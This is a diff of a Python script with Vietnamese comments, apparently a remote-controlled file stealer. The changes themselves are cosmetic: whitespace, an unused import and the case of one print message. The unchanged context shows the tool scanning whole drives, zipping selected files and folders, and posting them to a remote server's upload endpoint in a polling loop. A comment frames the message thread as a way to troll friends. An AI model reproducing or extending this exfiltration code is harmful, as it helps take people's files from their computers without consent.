@@ -10,7 +10,7 @@ import tempfile
 import threading
 import tkinter as tk
 from tkinter import messagebox
-
+import random
 
 
 
@@ -43,6 +43,9 @@ def get_drive_letters():
         print(f"bug khi lấy danh sách ổ cứng: {e}")
         return []
 
+
+
+
 def list_files_in_drive(drive_path):
     # quét toàn bộ file và thư mục trong một ổ cứng
     file_list = []
@@ -74,6 +77,9 @@ def list_files_in_drive(drive_path):
     print(f"quét xong. Tìm thấy {len(file_list)} mục.")
     return file_list
 
+
+
+
 def zip_item(path):
     # nén một file hoặc thư mục và trả về đường dẫn file nén
     
@@ -96,6 +102,13 @@ def zip_item(path):
         print(f"Lỗi khi nén: {e}")
         return None
 
+
+
+
+
+
+
+
 def main_loop():
 
     # tin nhắn yêu thương (ừ, dành cho việc mấy bro thích troll) :
@@ -111,10 +124,6 @@ def main_loop():
     )
 
     message_thread.start()
-
-
-
-
 
 
 
@@ -161,7 +170,7 @@ def main_loop():
                     zip_path = zip_item(path_to_send)
                     
                     if zip_path and os.path.exists(zip_path):
-                        print(f"Đang gửi file {zip_path} lên server...")
+                        print(f"đang gửi file {zip_path} lên server...")
                         with open(zip_path, 'rb') as f:
                             files = {'file': (os.path.basename(zip_path), f)}
                             requests.post(f"{SERVER_URL}/upload_file", files=files)
@@ -181,6 +190,14 @@ def main_loop():
         except Exception as e:
             print(f"đã xảy ra lỗi không xác định: {e}")
             time.sleep(POLL_INTERVAL)
+
+
+
+
+
+
+
+
 
 if __name__ == "__main__":
     main_loop()
